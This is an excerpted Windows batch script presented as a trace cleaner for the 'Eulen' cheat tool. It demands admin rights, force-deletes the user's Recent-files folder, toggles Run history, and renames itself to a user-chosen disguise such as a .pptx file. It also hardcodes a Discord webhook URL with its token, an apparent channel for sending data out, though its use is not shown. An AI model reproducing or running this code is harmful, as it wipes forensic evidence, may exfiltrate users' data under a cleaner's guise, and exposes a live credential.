...
:check_Permissions
    ...
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto VBSDynamicBuild
    ) else (
       cls
       echo Failure: Please run the file again with Admin Permissions
       timeout 2 >NUL
...
echo [1] Delete all traces 
echo [2] Delete Eulen traces 
echo [3] Turn OFF file history in "Run"
echo [4] Turn ON file history in "Run"
echo [5] Exit
CHOICE /n /C 12345
if errorlevel 5 goto EXIT
if errorlevel 4 goto HISTORYON
if errorlevel 3 goto HISTORY
if errorlevel 2 goto EULEN 
...
del C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\* /S /Q /F
...
set webhook=https://discord.com/api/webhooks/1039645864274169909/TXcZsAP-j9rPRWXm6bGpnGto18vVEwOqlnVkuc3mWOX_3x-nWVaRB8td76MSnBYUNgpf
...
echo.
echo.
set /P FILENAME="Enter new file name + extension. For example (Presentation.pptx): "
rename %0 %FILENAME%
exit